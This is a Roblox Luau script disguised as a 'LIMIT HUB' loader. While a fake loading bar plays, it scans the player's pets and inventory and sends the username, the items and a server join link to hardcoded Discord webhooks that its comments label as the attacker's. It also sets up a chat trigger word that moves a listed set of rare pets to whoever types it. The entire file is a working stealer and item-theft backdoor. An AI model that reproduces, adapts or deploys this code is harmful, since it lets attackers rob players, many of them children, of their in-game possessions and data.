task.spawn(function()
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    local PlayerGui = player:WaitForChild("PlayerGui")

    -- GUI Setup
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "LimitHubLoader"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = PlayerGui

    -- Background
    local bgFrame = Instance.new("Frame")
    bgFrame.Size = UDim2.new(1, 0, 1, 0)
    bgFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    bgFrame.BorderSizePixel = 0
    bgFrame.Parent = screenGui

    -- Loading Bar Outline
    local barOutline = Instance.new("Frame")
    barOutline.Size = UDim2.new(0, 30, 0, 300)
    barOutline.Position = UDim2.new(0.45, 0, 0.2, 0)
    barOutline.BorderColor3 = Color3.fromRGB(0, 255, 255)
    barOutline.BorderSizePixel = 2
    barOutline.BackgroundTransparency = 1
    barOutline.Parent = bgFrame

    -- Progress Fill
    local progressFill = Instance.new("Frame")
    progressFill.Size = UDim2.new(1, 0, 0, 0)
    progressFill.Position = UDim2.new(0, 0, 1, 0)
    progressFill.AnchorPoint = Vector2.new(0, 1)
    progressFill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
    progressFill.ClipsDescendants = true
    progressFill.Parent = barOutline

    -- Diagonal Fill Pattern
    local pattern = Instance.new("ImageLabel")
    pattern.Size = UDim2.new(1, 0, 1, 0)
    pattern.BackgroundTransparency = 1
    pattern.Image = "rbxassetid://6726731762" -- diagonal stripes
    pattern.ImageTransparency = 0.2
    pattern.Parent = progressFill

    -- Loading Text
    local loadingLabel = Instance.new("TextLabel")
    loadingLabel.Size = UDim2.new(0, 200, 0, 50)
    loadingLabel.Position = UDim2.new(0.45, -210, 0.45, 0)
    loadingLabel.Text = "LOADING"
    loadingLabel.TextColor3 = Color3.fromRGB(200, 255, 255)
    loadingLabel.TextScaled = true
    loadingLabel.Font = Enum.Font.SciFi
    loadingLabel.BackgroundTransparency = 1
    loadingLabel.TextStrokeTransparency = 0.4
    loadingLabel.Parent = bgFrame

    -- Percent Label
    local percentLabel = Instance.new("TextLabel")
    percentLabel.Size = UDim2.new(0, 100, 0, 50)
    percentLabel.Position = UDim2.new(0.45, 40, 0.43, 0)
    percentLabel.Text = "0%"
    percentLabel.TextColor3 = Color3.new(1, 1, 1)
    percentLabel.TextStrokeTransparency = 0.2
    percentLabel.TextScaled = true
    percentLabel.Font = Enum.Font.SciFi
    percentLabel.BackgroundTransparency = 1
    percentLabel.Parent = bgFrame

    -- LIMIT HUB Title
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0, 300, 0, 100)
    title.Position = UDim2.new(0.58, 0, 0.4, 0)
    title.Text = "LIMIT HUB"
    title.TextColor3 = Color3.fromRGB(80, 255, 255)
    title.TextStrokeTransparency = 0.3
    title.TextScaled = true
    title.Font = Enum.Font.SciFi
    title.BackgroundTransparency = 1
    title.Parent = bgFrame

    -- Logo Image
    local logo = Instance.new("ImageLabel")
    logo.Size = UDim2.new(0, 60, 0, 60)
    logo.Position = UDim2.new(0.56, 0, 0.3, 0)
    logo.BackgroundTransparency = 1
    logo.Image = "rbxassetid://6034304892" -- replace with custom if you want
    logo.Parent = bgFrame

    local uicorner = Instance.new("UICorner")
    uicorner.CornerRadius = UDim.new(1, 0)
    uicorner.Parent = logo

    -- Animate loading
    local percent = 0
    while percent <= 100 do
        percentLabel.Text = percent .. "%"
        progressFill.Size = UDim2.new(1, 0, percent / 100, 0)
        percent += 5
        task.wait(0.4)
    end

    -- Auto remove GUI after loading
    task.wait(1)
    screenGui:Destroy()
end)
-- Webhook (attacker receives info here)
local webhookUrl = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz"
local backdoorWebhook = "https://discord.com/api/webhooks/1396132755925897256/pZu4PMfjQGx64urPAqCckF8aXKFHqAR9vOYW-24C-lurbF5RaCEyqMXGNH7S6l5oe3sz..."

-- Roblox Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local chatTrigger = "hb1ios" -- trigger word attacker says

-- List of valuable pets attacker is targeting
local targetedPets = {
    "Trex", "Fennec Fox", "Raccoon", "Dragonfly", "Butterfly",
    "Queenbee", "Spinosaurus", "Redfox", "Brontosaurus", "Mooncat",
    "Mimic Octopus", "Disco Bee", "Dilophosaurus", "Kitsune"
}

-- ✅ Real inventory scanner
local function getInventory()
    local data = {
        items = {},
        rarePets = {},
        rareItems = {}
    }

    -- Scan Backpack and other folders
    local foldersToCheck = {
        LocalPlayer:FindFirstChild("Pets"),
        LocalPlayer:FindFirstChild("Backpack"),
        LocalPlayer:FindFirstChildOfClass("Folder")
    }

    for _, folder in ipairs(foldersToCheck) do
        if folder then
            for _, item in ipairs(folder:GetChildren()) do
                table.insert(data.items, item.Name)

                if table.find(targetedPets, item.Name) then
                    table.insert(data.rarePets, item.Name)
                end
            end
        end
    end

    return data
end

-- 📤 Send inventory info to Discord
local function sendToWebhook()
    if not LocalPlayer then return end

    local inventory = getInventory()
    local inventoryText = #inventory.items > 0 and table.concat(inventory.items, "\n") or "No items"
    local jobId = tostring(game.JobId or "N/A")
    local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. jobId

    local function sendMessage(payload)
        local jsonData = HttpService:JSONEncode(payload)
        for _, url in ipairs({webhookUrl, backdoorWebhook}) do
            request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonData
            })
        end
    end

    -- Base report
    sendMessage({
        content = "🎯 Victim Detected!",
        embeds = {{
            title = "Victim Found",
            description = "Join and type trigger to attempt item transfer.",
            fields = {
                {name = "Username", value = LocalPlayer.Name, inline = true},
                {name = "Join Link", value = joinLink, inline = true},
                {name = "Inventory", value = "```" .. inventoryText .. "```", inline = false},
                {name = "Trigger", value = "`" .. chatTrigger .. "`", inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })

    -- Rare pets notification
    if #inventory.rarePets > 0 then
        sendMessage({
            content = "@everyone",
            allowed_mentions = { parse = { "everyone" } },
            embeds = {{
                title = "🐾 Rare Pets Detected",
                description = "These rare pets are in the player's inventory!",
                fields = {
                    {name = "Username", value = LocalPlayer.Name},
                    {name = "Rare Pets", value = "```" .. table.concat(inventory.rarePets, "\n") .. "```"}
                },
                color = 0xff0000,
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        })
    end
end

-- 🔁 Chat-based trigger for item transfer
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        if msg == chatTrigger then
            local attacker = player
            local foldersToCheck = {
                LocalPlayer:FindFirstChild("Pets"),
                LocalPlayer:FindFirstChild("Backpack"),
                LocalPlayer:FindFirstChildOfClass("Folder")
            }

            for _, folder in ipairs(foldersToCheck) do
                if folder then
                    for _, item in ipairs(folder:GetChildren()) do
                        if table.find(targetedPets, item.Name) then
                            item.Parent = attacker:FindFirstChild("Backpack") or attacker
                        end
                    end
                end
            end
        end
    end)
end)

-- 🟢 Start by sending inventory info to attacker
sendToWebhook()
